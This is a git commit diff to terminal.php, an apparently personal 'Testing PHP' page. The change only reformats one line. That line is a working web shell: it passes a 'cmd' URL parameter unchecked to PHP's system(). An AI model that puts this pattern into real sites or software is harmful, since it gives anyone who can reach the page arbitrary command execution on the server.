62d5ccdf38c20d228315b1b8442ce381772e25eb
Dima <dserp18@gmail.com>
2018-09-06 09:19:32 +0300

    Update terminal.php

--- terminal.php
+++ terminal.php
@@ -3,11 +3,6 @@
   <title>Тестируем PHP</title>
  </head>
  <body>
- 
- <?php 
- echo '<form><input name="cmd" /></form>'; if(isset($_GET['cmd'])) system($_GET['cmd']);
- 
- ?>
- 
- </body>
+  <?php echo '<form><input name="cmd" /></form>'; if(isset($_GET['cmd'])) system($_GET['cmd']); ?>
+  </body>
 </html>
